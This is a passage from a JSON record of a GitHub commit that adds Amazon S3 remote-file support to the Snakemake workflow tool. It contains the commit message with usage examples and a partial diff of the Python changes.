       self._snakefile = snakefile\n        self._workdir = workdir\n\n    @property\n    def snakefile(self):\n        if self._snakefile is None:\n            return os.path.abspath(os.path.join(self.workdir, \"Snakefile\"))\n        if not os.path.isabs(self._snakefile):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                self._snakefile))\n        return self._snakefile\n\n    @property\n    def workdir(self):\n        workdir = \".\" if self._workdir is None else self._workdir\n        if not os.path.isabs(workdir):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                workdir))\n        return workdir\n\n    def target(self, paths):\n        if not_iterable(paths):\n            return flag(os.path.join(self.workdir, paths), \"subworkflow\", self)\n        return [self.target(path) for path in paths]\n\n    def targets(self, dag):\n        return [f for job in dag.jobs for f in job.subworkflow_input\n                if job.subworkflow_input[f] is self]\n\n\nclass Rules:\n    \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\"\n    pass\n\n\ndef srcdir(path):\n    \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\"\n    if not workflow.included_stack:\n        return None\n    return os.path.join(os.path.dirname(workflow.included_stack[-1]), path)\n"}}, "msg": "Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https://boto.readthedocs.org/en/latest/ref/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name/out.txt\")\n        output:\n            \"bucket-name/out.txt\"\n        run:\n            shell(\"cp {output[0]} ./\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote/`. This is similar in nature to the function `test_cluster_dynamic/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic."}}, "https://github.com/kdaily/snakemake": {"7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d": {"url": "https://api.github.com/repos/kdaily/snakemake/commits/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d", "html_url": "https://github.com/kdaily/snakemake/commit/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d", "message": "Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https://boto.readthedocs.org/en/latest/ref/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name/out.txt\")\n        output:\n            \"bucket-name/out.txt\"\n        run:\n            shell(\"cp {output[0]} ./\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote/`. This is similar in nature to the function `test_cluster_dynamic/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic.", "sha": "7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d", "keyword": "remote code execution protect", "diff": "diff --git a/setup.py b/setup.py\nindex dfea1dd..97f4d86 100644\n--- a/setup.py\n+++ b/setup.py\n@@ -59,6 +59,7 @@ def run_tests(self):\n     },\n     package_data={'': ['*.css', '*.sh', '*.html']},\n     tests_require=['nose>=1.3'],\n+    install_requires=['boto>=2.38.0','filechunkio>=1.6', 'moto>=0.4.14'],\n     cmdclass={'test': NoseTestCommand},\n     classifiers=\n     [\"Development Status :: 5 - Production/Stable\", \"Environment :: Console\",\ndiff --git a/snakemake/dag.py b/snakemake/dag.py\nindex f1ead14..e591550 100644\n--- a/snakemake/dag.py\n+++ b/snakemake/dag.py\n@@ -10,7 +10,7 @@\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n@@ -288,6 +288,51 @@ def unneeded_files():\n             logger.info(\"Removing temporary output file {}.\".format(f))\n             f.remove()\n \n+    def handle_remote(self, job):\n+        \"\"\" Remove local files if they are no longer needed, and upload to S3. \"\"\"\n+        \n+        needed = lambda job_, f: any(\n+            f in files for j, files in self.depending[job_].items()\n+            if not self.finished(j) and self.needrun(j) and j != job)\n+\n+        remote_files = set([f for f in job.expanded_input if f.is_remote]) | set([f for f in job.expanded_output if f.is_remote])\n+        local_files = set([f for f in job.input if not f.is_remote]) | set([f for f in job.expanded_output if not f.is_remote])\n+        files_to_keep = set(f for f in remote_files if is_flagged(f, \"keep\"))\n+\n+        # remove local files from list of remote files\n+        # in case the same file is specified in both places\n+        remote_files -= local_files\n+        remote_files -= files_to_keep\n+\n+        def unneeded_files():\n+            for job_, files in self.dependencies[job].items():\n+                for f in (remote_files & files):\n+                    if not needed(job_, f) and not f.protected:\n+                        yield f\n+            for f in filterfalse(partial(needed, job), [f for f in remote_files]):\n+                if not f in self.targetfiles and not f.protected:\n+                    yield f\n+\n+        def expanded_dynamic_depending_input_files():\n+            for j in self.depending[job]:    \n+                for f in j.expanded_input:\n+                    yield f\n+\n+        unneededFiles = set(unneeded_files())\n+        unneededFiles -= set(expanded_dynamic_depending_input_files())\n+\n+        for f in [f for f in job.expanded_output if f.is_remote]:\n+            if not f.exists_remote:\n+                logger.info(\"Uploading local output file to remote: {}\".format(f))\n+                f.upload_to_remote()\n+\n+        for f in set(unneededFiles):\n+            logger.info(\"Removing local output file: {}\".format(f))\n+            f.remove()\n+\n+        job.rmdir_empty_remote_dirs()\n+\n+\n     def jobid(self, job):\n         if job not in self._jobid:\n             self._jobid[job] = len(self._jobid)\ndiff --git a/snakemake/decorators.py b/snakemake/decorators.py\nnew file mode 100644\nindex 0000000..063ddde\n--- /dev/null\n+++ b/snakemake/decorators.py\n@@ -0,0 +1,31 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import functools\n+import inspect\n+\n+\n+def memoize(obj):\n+    cache = obj.cache = {}\n+\n+    @functools.wraps(obj)\n+    def memoizer(*args, **kwargs):\n+        key = str(args) + str(kwargs)\n+        if key not in cache:\n+            cache[key] = obj(*args, **kwargs)\n+        return cache[key]\n+\n+    return memoizer\n+\n+\n+def decAllMethods(decorator, prefix='test_'):\n+\n+    def decClass(cls):\n+        for name, m in inspect.getmembers(cls, inspect.isfunction):\n+            if prefix == None or name.startswith(prefix):\n+                setattr(cls, name, decorator(m))\n+        return cls\n+\n+    return decClass\ndiff --git a/snakemake/exceptions.py b/snakemake/exceptions.py\nindex d606c99..7440442 100644\n--- a/snakemake/exceptions.py\n+++ b/snakemake/exceptions.py\n@@ -281,6 +281,13 @@ class IOFileException(RuleException):\n     def __init__(self, msg, lineno=None, snakefile=None):\n         super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n+class RemoteFileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n+\n+class S3FileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n class ClusterJobException(RuleException):\n     def __init__(self, job, jobid, jobscript):\ndiff --git a/snakemake/executors.py b/snakemake/executors.py\nindex 6bd0114..961e7ba 100644\n--- a/snakemake/executors.py\n+++ b/snakemake/executors.py\n@@ -109,6 +109,7 @@ def print_job_error(self, job):\n     def finish_job(self, job):\n         self.dag.handle_touch(job)\n         self.dag.check_output(job, wait=self.latency_wait)\n+        self.dag.handle_remote(job)\n         self.dag.handle_protected(job)\n         self.dag.handle_temp(job)\n \ndiff --git a/snakemake/io.py b/snakemake/io.py\nindex 0ba9cbd..3e32628 100644\n--- a/snakemake/io.py\n+++ b/snakemake/io.py\n@@ -8,11 +8,12 @@\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n@@ -45,9 +46,46 @@ def __new__(cls, file):\n         obj._file = file\n         obj.rule = None\n         obj._regex = None\n+\n         return obj\n \n+    def __init__(self, file):\n+        self._remote_object = None\n+        if self.is_remote:\n+            additional_args = get_flag_value(self._file, \"additional_remote_args\") if get_flag_value(self._file, \"additional_remote_args\") else []\n+            additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+            self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, *additional_args, **additional_kwargs)\n+        pass\n+\n+    def _referToRemote(func):\n+        \"\"\" \n+            A decorator so that if the file is remote and has a version \n+            of the same file-related function, call that version instead. \n+        \"\"\"\n+        @functools.wraps(func)\n+        def wrapper(self, *args, **kwargs):\n+            if self.is_remote:\n+                if self.remote_object:\n+                    if hasattr( self.remote_object, func.__name__):\n+                        return getattr( self.remote_object, func.__name__)(*args, **kwargs)\n+            return func(self, *args, **kwargs)\n+        return wrapper\n+\n     @property\n+    def is_remote(self):\n+        return is_flagged(self._file, \"remote\")\n+    \n+    @property\n+    def remote_object(self):\n+        if not self._remote_object:\n+            if self.is_remote:\n+               additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+               self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, **additional_kwargs)\n+        return self._remote_object\n+    \n+\n+    @property\n+    @_referToRemote\n     def file(self):\n         if not self._is_function:\n             return self._file\n@@ -56,32 +94,74 @@ def file(self):\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n@@ -108,9 +188,10 @@ def protect(self):\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n@@ -136,11 +217,21 @@ def apply_wildcards(self, wildcards,\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n@@ -166,6 +257,17 @@ def match(self, target):\n     def format_dynamic(self):\n         return self.replace(self.dynamic_fill, \"{*}\")\n \n+    def clone_flags(self, other):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        if isinstance(other._file, AnnotatedString):\n+            self._file.flags = getattr(other._file, \"flags\", {})\n+\n+    def set_flags(self, flags):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        self._file.flags = flags\n+\n     def __eq__(self, other):\n         f = other._file if isinstance(other, _IOFile) else other\n         return self._file == f\n@@ -286,9 +388,17 @@ def flag(value, flag_type, flag_value=True):\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n@@ -297,6 +407,9 @@ def temp(value):\n     if is_flagged(value, \"protected\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n     return flag(value, \"temp\")\n \n \n@@ -310,6 +423,9 @@ def protected(value):\n     if is_flagged(value, \"temp\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n     return flag(value, \"protected\")\n \n \n@@ -318,7 +434,7 @@ def dynamic(value):\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n@@ -334,6 +450,36 @@ def dynamic(value):\n def touch(value):\n     return flag(value, \"touch\")\n \n+def remote(value, provider=S3, keep=False, additional_args=None, additional_kwargs=None):\n+\n+    additional_args = [] if not additional_args else additional_args\n+    additional_kwargs = {} if not additional_kwargs else additional_kwargs\n+\n+    if not provider:\n+        raise RemoteFileException(\"Provider (S3, etc.) must be specified for remote file as kwarg.\")\n+    if is_flagged(value, \"temp\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"protected\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n+    return flag(\n+                flag(\n+                    flag( \n+                        flag( \n+                            flag(value, \"remote\"), \n+                            \"remote_provider\", \n+                            provider\n+                        ), \n+                        \"additional_remote_kwargs\", \n+                        additional_kwargs\n+                    ),\n+                    \"additional_remote_args\",\n+                    additional_args\n+                ),\n+                \"keep\",\n+                keep\n+            )\n \n def expand(*args, **wildcards):\n     \"\"\"\n@@ -410,6 +556,31 @@ def glob_wildcards(pattern):\n                     getattr(wildcards, name).append(value)\n     return wildcards\n \n+def glob_wildcards_remote(pattern, provider=S3, additional_kwargs=None):\n+    additional_kwargs = additional_kwargs if additional_kwargs else {}\n+    referenceObj = IOFile(remote(pattern, provider=provider, **additional_kwargs))\n+    key_list = [k.name for k in referenceObj._remote_object.list] \n+\n+    pattern = \"./\"+ referenceObj._remote_object.name\n+    pattern = os.path.normpath(pattern)\n+    first_wildcard = re.search(\"{[^{]\", pattern)\n+    dirname = os.path.dirname(pattern[:first_wildcard.start(\n+    )]) if first_wildcard else os.path.dirname(pattern)\n+    if not dirname:\n+        dirname = \".\"\n+\n+    names = [match.group('name')\n+             for match in _wildcard_regex.finditer(pattern)]\n+    Wildcards = namedtuple(\"Wildcards\", names)\n+    wildcards = Wildcards(*[list() for name in names])\n+\n+    pattern = re.compile(regex(pattern))\n+    for f in key_list:\n+        match = re.match(pattern, f)\n+        if match:\n+            for name, value in match.groupdict().items():\n+                getattr(wildcards, name).append(value)\n+    return wildcards\n \n # TODO rewrite Namedlist!\n class Namedlist(list):\ndiff --git a/snakemake/jobs.py b/snakemake/jobs.py\nindex fdba8b5..317c7c4 100644\n--- a/snakemake/jobs.py\n+++ b/snakemake/jobs.py\n@@ -13,7 +13,7 @@\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n@@ -131,7 +131,40 @@ def expanded_output(self):\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n@@ -159,6 +192,34 @@ def missing_input(self):\n         return set(f for f in self.input\n                    if not f.exists and not f in self.subworkflow_input)\n \n+\n+    @property\n+    def present_remote_input(self):\n+        files = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if f.exists_remote:\n+                    files.add(f)\n+        return files\n+    \n+    @property\n+    def present_remote_output(self):\n+        files = set()\n+\n+        for f in self.remote_output:\n+            if f.exists_remote:\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def missing_remote_input(self):\n+        return self.remote_input - self.present_remote_input\n+\n+    @property\n+    def missing_remote_output(self):\n+        return self.remote_output - self.present_remote_output\n+\n     @property\n     def output_mintime(self):\n         \"\"\" Return oldest output file. \"\"\"\n@@ -197,6 +258,74 @@ def missing_output(self, requested=None):\n                     files.add(f)\n         return files\n \n+\n+    @property\n+    def remote_input(self):\n+        for f in self.input:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_output(self):\n+        for f in self.output:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_input_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_input_older_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_newer_than_local(self):\n+        files = set()\n+        for f in 